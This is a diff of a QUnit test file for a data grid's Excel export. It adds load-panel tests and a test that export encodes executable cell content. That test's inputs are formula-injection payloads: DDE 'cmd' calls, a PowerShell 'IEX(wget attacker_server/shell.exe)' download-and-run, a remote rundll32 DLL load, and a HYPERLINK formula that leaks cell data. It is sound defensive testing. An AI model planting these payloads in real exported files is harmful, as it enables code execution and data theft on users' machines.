-            const ds = [{ f1: 'f1_1' }];
-            const locale = localization.locale();
-
-            try {
-                if(localizationText.type === 'default') {
-                    localization.loadMessages(ja);
-                } else {
-                    messageLocalization.load({
-                        'ja': {
-                            'dxDataGrid-exporting': '!CUSTOM TEXT!'
-                        }
-                    });
-                }
-
-                localization.locale('ja');
-
-                const dataGrid = $('#dataGrid').dxDataGrid({
-                    dataSource: ds,
-                    loadingTimeout: undefined,
-                    showColumnHeaders: false
-                }).dxDataGrid('instance');
-
-                let actualLoadPanelText;
-
-                const loadPanelOnShownHandler = () => {
-                    actualLoadPanelText = dataGrid.option('loadPanel').text;
-                };
-
-                dataGrid.option('loadPanel.onShown', loadPanelOnShownHandler);
-
-                exportDataGrid({ component: dataGrid, worksheet: this.worksheet }).then(() => {
-                    assert.strictEqual(actualLoadPanelText, localizationText.expected, 'loadPanel.text');
-                    done();
-                });
-            } finally {
-                localization.locale(locale);
-            }
         });
     });
 });
@@ -6656,7 +6447,7 @@ QUnit.module('OutlineLevel', moduleConfig, () => {
                 { dataField: 'f1', groupIndex: 0 },
                 { dataField: 'f2' },
             ],
-            loadingTimeout: undefined,
+            loadingTimeout: null,
             showColumnHeaders: false
         }).dxDataGrid('instance');
 
@@ -6682,7 +6473,7 @@ QUnit.module('OutlineLevel', moduleConfig, () => {
                 { dataField: 'f1', groupIndex: 0 },
                 { dataField: 'f2' },
             ],
-            loadingTimeout: undefined,
+            loadingTimeout: null,
             showColumnHeaders: false
         }).dxDataGrid('instance');
 
@@ -6707,4 +6498,108 @@ ExcelJSLocalizationFormatTests.runCurrencyTests([
     { value: 'LBP', expected: '$#,##0_);\\($#,##0\\)' }, // NOT SUPPORTED in default
     { value: 'SEK', expected: '$#,##0_);\\($#,##0\\)' } // NOT SUPPORTED in default
 ]);
-ExcelJSOptionTests.runTests(moduleConfig, exportDataGrid.__internals._getFullOptions, function() { return $('#dataGrid').dxDataGrid({}).dxDataGrid('instance'); });
+ExcelJSOptionTests.runTests(moduleConfig, exportDataGrid.__internals._getFullOptions, () => $('#dataGrid').dxDataGrid({}).dxDataGrid('instance'));
+
+
+[
+    { enabled: true },
+    { enabled: false },
+    { enabled: 'auto' },
+    {},
+    null,
+    undefined,
+    false,
+    true,
+].forEach((loadPanel) => {
+    LoadPanelTests.runTests(moduleConfig, exportDataGrid, (options) => $('#dataGrid').dxDataGrid(options).dxDataGrid('instance'),
+        {
+            dataSource: [{ f1: 'f1_1' }],
+            loadPanel,
+            loadingTimeout: null
+        }, 'worksheet');
+});
+LoadPanelTests.runTests(moduleConfig, exportDataGrid, (options) => $('#dataGrid').dxDataGrid(options).dxDataGrid('instance'),
+    {
+        dataSource: [{ f1: 'f1_1' }],
+        loadingTimeout: null
+    }, 'worksheet');
+
+QUnit.module('encodeExecutableContent option', moduleConfig, () => {
+    QUnit.test('All executable cell content should be encoded if encodeExecutableContent = true', function(assert) {
+        const done = assert.async();
+
+        const dataSource = [
+            { value: '=test', expected: { excelCell: { value: '"\'=test"', numFmt: '@' } } },
+            { value: '="test"', expected: { excelCell: { value: '"\'=""test"""', numFmt: '@' } } },
+            { value: '="test ', expected: { excelCell: { value: '"\'=""test "', numFmt: '@' } } },
+            { value: '=cmd|\' /C calc\'!A1', expected: { excelCell: { value: '"\'=cmd|\' /C calc\'!A1"', numFmt: '@' } } },
+            { value: '5', expected: { excelCell: { value: '5' } } },
+            { value: '"5"', expected: { excelCell: { value: '"5"' } } },
+            { value: '+5', expected: { excelCell: { value: '+5', numFmt: '@' } } },
+            { value: '"+5"', expected: { excelCell: { value: '"+5"' } } },
+            { value: '-5', expected: { excelCell: { value: '-5', numFmt: '@' } } },
+            { value: '"-5"', expected: { excelCell: { value: '"-5"' } } },
+            { value: '5.5', expected: { excelCell: { value: '5.5' } } },
+            { value: '"5.5"', expected: { excelCell: { value: '"5.5"' } } },
+            { value: '-5.5', expected: { excelCell: { value: '-5.5', numFmt: '@' } } },
+            { value: '"-5.5"', expected: { excelCell: { value: '"-5.5"' } } },
+            { value: '+5.5', expected: { excelCell: { value: '+5.5', numFmt: '@' } } },
+            { value: '"+5.5"', expected: { excelCell: { value: '"+5.5"' } } },
+            { value: '=5', expected: { excelCell: { value: '"\'=5"', numFmt: '@' } } },
+            { value: '"=5"', expected: { excelCell: { value: '"\'=5"' } } },
+            { value: '@5', expected: { excelCell: { value: '"\'@5"', numFmt: '@' } } },
+            { value: '"@5"', expected: { excelCell: { value: '"\'@5"' } } },
+            { value: '=2+5', expected: { excelCell: { value: '"\'=2+5"', numFmt: '@' } } },
+            { value: '"=2+5"', expected: { excelCell: { value: '"\'=2+5"' } } },
+            { value: '+2+5', expected: { excelCell: { value: '"\'+2+5"', numFmt: '@' } } },
+            { value: '"+2+5"', expected: { excelCell: { value: '"\'+2+5"' } } },
+            { value: '-2+5', expected: { excelCell: { value: '"\'-2+5"', numFmt: '@' } } },
+            { value: '"-2+5"', expected: { excelCell: { value: '"\'-2+5"' } } },
+            { value: '+', expected: { excelCell: { value: '+', numFmt: '@' } } },
+            { value: '"+"', expected: { excelCell: { value: '"+"' } } },
+            { value: '=++', expected: { excelCell: { value: '"\'=++"', numFmt: '@' } } },
+            { value: '"=++"', expected: { excelCell: { value: '"\'=++"' } } },
+            { value: '-', expected: { excelCell: { value: '-', numFmt: '@' } } },
+            { value: '"-"', expected: { excelCell: { value: '"-"' } } },
+            { value: '=', expected: { excelCell: { value: '=', numFmt: '@' } } },
+            { value: '"="', expected: { excelCell: { value: '"="' } } },
+            { value: '@', expected: { excelCell: { value: '@', numFmt: '@' } } },
+            { value: '@MyData"Column', expected: { excelCell: { value: '"\'@MyData""Column"', numFmt: '@' } } },
+            { value: '"@"', expected: { excelCell: { value: '"@"' } } },
+            { value: '=1+2";=1+2', expected: { excelCell: { value: '"\'=1+2"";=1+2"', numFmt: '@' } } },
+            { value: '=1+2\'" ;,=1+2', expected: { excelCell: { value: '"\'=1+2\'"" ;,=1+2"', numFmt: '@' } } },
+            { value: '=CONCATENATE("1","2")', expected: { excelCell: { value: '"\'=CONCATENATE(""1"",""2"")"', numFmt: '@' } } },
+            { value: '\ttab', expected: { excelCell: { value: '"\'	tab"' } } },
+            { value: '\rCarriage return', expected: { excelCell: { value: '"\'\rCarriage return"' } } },
+            { value: '\r=2+3', expected: { excelCell: { value: '"\'\r=2+3"' } } },
+            { value: '=DDE ("cmd";"/C calc";"!A0")A0', expected: { excelCell: { value: '"\'=DDE (""cmd"";""/C calc"";""!A0"")A0"', numFmt: '@' } } },
+            { value: '@SUM(1+9)*cmd|\' /C calc\'!A0', expected: { excelCell: { value: '"\'@SUM(1+9)*cmd|\' /C calc\'!A0"', numFmt: '@' } } },
+            { value: '=10+20+cmd|\' /C calc\'!A0\'', expected: { excelCell: { value: '"\'=10+20+cmd|\' /C calc\'!A0\'"', numFmt: '@' } } },
+            { value: '=cmd|\' /C notepad\'!\'A1\'', expected: { excelCell: { value: '"\'=cmd|\' /C notepad\'!\'A1\'"', numFmt: '@' } } },
+            { value: '=cmd|\'/C powershell IEX(wget attacker_server/shell.exe)\'!A0\'', expected: { excelCell: { value: '"\'=cmd|\'/C powershell IEX(wget attacker_server/shell.exe)\'!A0\'"', numFmt: '@' } } },
+            { value: '=cmd|\'/c rundll32.exe \\10.0.0.1\\3\\2\\1.dll,0\'!_xlbgnm.A1', expected: { excelCell: { value: '"\'=cmd|\'/c rundll32.exe \\10.0.0.1\\3\\2\\1.dll,0\'!_xlbgnm.A1"', numFmt: '@' } } },
+            { value: '=HYPERLINK("http://example.com?leak="&A1&A2,"Error: please click for further information")', expected: { excelCell: { value: '"\'=HYPERLINK(""http://example.com?leak=""&A1&A2,""Error: please click for further information"")"', numFmt: '@' } } },
+        ];
+
+        const dataGrid = $('#dataGrid').dxDataGrid({
+            columns: [{ dataField: 'value' }],
+            dataSource,
+            showColumnHeaders: false,
+            loadingTimeout: null
+        }).dxDataGrid('instance');
+
+        const expectedCells = dataSource.map((cell) => [cell.expected]);
+
+        helper._extendExpectedCells(expectedCells, { row: 1, column: 1 });
+
+        exportDataGrid({
+            component: dataGrid,
+            worksheet: this.worksheet,
+            encodeExecutableContent: true,
+        }).then(() => {
+            helper.checkValues(expectedCells);
+            helper.checkCellFormat(expectedCells);
+            done();
+        });
+    });
+});
